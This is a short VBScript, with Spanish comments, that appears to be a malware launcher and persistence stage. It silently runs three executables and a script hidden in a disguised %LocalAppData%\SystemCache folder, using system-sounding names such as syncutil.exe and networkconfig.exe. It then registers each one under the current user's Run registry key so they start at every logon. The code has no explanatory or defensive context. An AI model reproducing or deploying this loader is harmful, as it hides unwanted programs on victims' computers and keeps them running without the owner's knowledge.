Dim j, k, l, m, n, o, p, q, r, s

Set j = CreateObject("WScript.Shell")
Set k = CreateObject("Scripting.FileSystemObject")

l = j.ExpandEnvironmentStrings("%LocalAppData%\SystemCache")
m = l & "\syncutil.exe"
n = l & "\networkconfig.exe"
o = l & "\startup.vbs"

p = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
q = "SyncUtility"
r = "NetworkConfig"
s = "StartupScript"

' Ejecutar los archivos
If k.FileExists(m) Then
    j.Run Chr(34) & m & Chr(34), 0, False
End If

If k.FileExists(n) Then
    j.Run Chr(34) & n & Chr(34), 0, False
End If

If k.FileExists(o) Then
    j.Run Chr(34) & o & Chr(34), 0, False
End If

' Registrar en el inicio automático
j.RegWrite p & "\" & q, Chr(34) & m & Chr(34), "REG_SZ"
j.RegWrite p & "\" & r, Chr(34) & n & Chr(34), "REG_SZ"
j.RegWrite p & "\" & s, Chr(34) & o & Chr(34), "REG_SZ"

Set j = Nothing
Set k = Nothing
